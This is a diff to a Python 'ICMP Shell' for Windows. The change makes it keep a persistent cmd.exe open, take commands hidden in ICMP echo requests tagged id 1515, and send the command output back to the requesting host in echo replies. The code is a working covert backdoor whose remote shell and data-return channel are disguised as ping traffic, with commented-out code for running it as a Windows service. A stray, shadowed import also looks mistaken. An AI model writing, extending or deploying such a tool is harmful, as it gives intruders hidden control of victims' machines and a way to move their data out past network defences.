@@ -11,6 +11,7 @@ import time
 import servicemanager
 import win32event
 import win32service
+from Demos.print_desktop import p
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
 from scapy.sendrecv import sniff, send
@@ -22,6 +23,31 @@ import win32serviceutil
 
 output = None
 error = None
+p = None
+destination=""
+
+
+def readstdout():
+    for l in iter(p.stdout.readline, b""):
+        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
+        reply_packet = IP(dst=destination) / ICMP(type=0, id=1515) / string
+        send(reply_packet, verbose=False)
+        sys.stdout.write(string)
+
+
+# Function to read and print stderr of the subprocess
+def readstderr():
+    for l in iter(p.stderr.readline, b""):
+        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
+        reply_packet = IP(dst=destination) / ICMP(type=0, id=1515) / string
+        send(reply_packet, verbose=False)
+        sys.stderr.write(string)
+
+
+# Function to send a command to the subprocess
+def sendcommand(cmd):
+    p.stdin.write(cmd.encode() + b"\n")
+    p.stdin.flush()
 
 
 def split_string_by_bytes(input_string, byte_length):
@@ -31,37 +57,36 @@ def split_string_by_bytes(input_string, byte_length):
 
 
 def packet_callback(packet):
-    global output
-    global error
+    global destination
     if ICMP in packet and packet[ICMP].id == 1515 and packet[ICMP].type == 8:
+        destination = packet[IP].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
-        print("-----+ IN DATA +------")
-        print(received_data)
         print("-----+ OUT DATA +-----")
-        child_conn, process = ish_open.popen2(received_data)
-        ishell.sendhdr.cntrl = 0
-
-        #process.stdin.close()
-
-        output = process.stdout.read()
-        error = process.stderr.read()
-
-        os.close(child_conn)
-        process.communicate()
-
-        output = output.decode('cp866').strip()
-        error = error.decode('cp866').strip()
-        print(output)
-        print(error)
-        if output == '':
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
-            send(reply_packet, verbose=False)
-        else:
-            data_list = split_string_by_bytes(output, 200)
-            data_list.append('\n')
-            for p in data_list:
-                reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
-                send(reply_packet, verbose=False)
+        # child_conn, process = ish_open.popen2(received_data)
+        # ishell.sendhdr.cntrl = 0
+        #
+        ##process.stdin.close()
+        #
+        # output = process.stdout.read()
+        # error = process.stderr.read()
+        #
+        # os.close(child_conn)
+        # process.communicate()
+        #
+        # output = output.decode('cp866').strip()
+        # error = error.decode('cp866').strip()
+        # print(output)
+        # print(error)
+        sendcommand(received_data)
+        #if output == '':
+        #    reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
+        #    send(reply_packet, verbose=False)
+        #else:
+        #    data_list = split_string_by_bytes(output, 200)
+        #    data_list.append('\n')
+        #    for p in data_list:
+        #        reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
+        #        send(reply_packet, verbose=False)
         # reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in
         # data_list] reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output)
         # send(reply_packet, verbose=False)
@@ -123,6 +148,7 @@ def edaemon():
 
 
 def main():
+    global p
     ish_debug = 1
 
     parser = argparse.ArgumentParser(description='ICMP Shell')
@@ -142,6 +168,19 @@ def main():
         ishell.ish_info.packetsize = args.p
     if args.d:
         ish_debug = 0
+
+    p = subprocess.Popen(
+        "cmd.exe",
+        stdout=subprocess.PIPE,
+        stdin=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+
+    t1 = threading.Thread(target=readstdout)
+    t2 = threading.Thread(target=readstderr)
+
+    t1.start()
+    t2.start()
 
     if (ish_debug):
         # if edaemon():
@@ -240,9 +279,9 @@ def server():
 
 if __name__ == '__main__':
     main()
-    #if len(sys.argv) == 1:
+    # if len(sys.argv) == 1:
     #    servicemanager.Initialize()
     #    servicemanager.PrepareToHostSingle(Service)
     #    servicemanager.StartServiceCtrlDispatcher()
-    #else:
+    # else:
     #    win32serviceutil.HandleCommandLine(Service)
